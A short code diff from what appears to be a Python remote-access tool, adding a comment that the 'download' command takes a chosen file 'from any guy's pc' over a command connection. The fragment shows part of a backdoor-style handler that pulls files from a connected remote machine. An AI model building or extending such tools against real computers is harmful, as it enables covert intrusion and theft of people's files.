@@ -54,6 +54,8 @@ while 1:
         files = files.decode()
         print("CustomD1R Find Result: ", files)
 
+# download - DOWNLOADS specific file from any guy's pc
+
     elif command == "download":
         conn.send(command.encode())
         filepath = input(str("Please enter the file P4TH including the filename and extension: "))
